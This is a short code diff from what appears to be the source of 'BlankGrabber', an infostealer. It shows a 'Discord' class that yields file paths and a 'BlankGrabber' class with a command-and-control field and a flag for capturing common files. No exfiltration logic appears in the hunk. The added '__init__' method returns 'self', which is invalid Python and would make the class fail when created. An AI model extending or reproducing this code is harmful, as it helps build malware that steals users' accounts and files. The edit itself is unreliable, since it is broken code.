@@ -889,6 +889,8 @@ class Discord:
                 yield path
 
 class BlankGrabber:
+    def __init__(self):
+        return self
     
     C2 = [0, ""]
     CaptureCommonFiles = True
